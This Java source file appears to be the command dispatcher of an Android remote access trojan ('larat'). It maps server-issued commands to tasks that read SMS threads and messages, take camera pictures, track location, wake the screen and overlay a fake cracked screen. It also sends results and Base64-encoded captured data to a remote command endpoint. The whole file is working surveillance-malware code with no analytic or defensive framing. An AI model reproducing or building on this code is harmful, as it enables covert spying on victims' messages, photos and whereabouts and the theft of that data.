package com.c4wd.commands;

import android.os.AsyncTask;
import android.util.Base64;

import com.c4wd.larat.Constants;
import com.c4wd.larat.RestClient;
import com.loopj.android.http.RequestParams;

import java.util.HashMap;

/**
 * Created by cory on 10/4/15.
 */
public class Command {

    private static HashMap<String, Class<? extends AsyncTask>> commandList;

    public static Class<?> getTask(String id) {
        return Command.commandList.get(id);
    }

    public static void initCommands() {
        if (Command.commandList == null) {
            Command.commandList = new HashMap<String, Class<? extends AsyncTask>>();
            //Adding commands is simple
            //commandList.put("String of command that is sent from the server", new Task.class);

            commandList.put("ScreenOn", GenericTasks.ScreenOnTask.class);
            commandList.put("SetLocationInterval", GenericTasks.SetLocationIntervalTask.class);
            commandList.put("Toast", GenericTasks.ToastTask.class);
            //drawing tasks

            commandList.put("OpenGL", DrawingTasks.OpenGLViewTask.class);
            commandList.put("Pong", DrawingTasks.PongTask.class);
            commandList.put("ScreenCrack", DrawingTasks.CrackScreenTask.class);
            commandList.put("ClearViews", DrawingTasks.ClearViewTask.class);
            commandList.put("ShowImage", DrawingTasks.DrawURLImage.class);
            //sms tasks

            commandList.put("CacheThread", SMSTasks.CacheThreadIdTask.class);
            commandList.put("GetMessages", SMSTasks.GetMessagesTask.class);
            commandList.put("GetThreads", SMSTasks.GetThreadsTask.class);
            //camera tasks

            commandList.put("TakePicture", CameraTasks.TakePictureTask.class);
        }
    }

    public static void reportResult(String result) {
        RequestParams params = new RequestParams();
        params.put("command", "addMessage");
        params.put("client_id", Constants.CLIENT_ID);
        params.put("message_type", "COMMAND_COMPLETED");
        params.put("message", result);
        RestClient.post("client_command.php", params);
    }

    public static void reportWarning(String result) {
        RequestParams params = new RequestParams();
        params.put("command", "addMessage");
        params.put("client_id", Constants.CLIENT_ID);
        params.put("message_type", "WARNING");
        params.put("message", result);
        RestClient.post("client_command.php", params);
    }

    public static void uploadData(byte[] data, String tag) {
        RequestParams params = new RequestParams();
        params.put("command", "file_upload");
        params.put("client_id", Constants.CLIENT_ID);
        params.put("message_type", tag);
        params.put("message", Base64.encodeToString(data, Base64.DEFAULT));
        RestClient.post("client_command.php", params);
    }
}
